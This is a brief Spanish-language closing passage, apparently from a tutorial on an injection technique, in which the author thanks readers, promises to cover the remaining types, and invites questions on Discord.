Espero que mis explicaciones hayan sido de tu agrado y que hayas entendido en profundidad este tipo de inyección. Seguiremos revisando los que faltan y aprendiendo cada día.

Muuuuuuchas gracias por leer, por invertirte este tiempo y nada, vamos pa lante a disfrutar la vida (:

Nos charlamos por ahí, cualquier duda me llegas al discord y miramos :* A seguir rompiendo de todoooooooooooooooooooo!!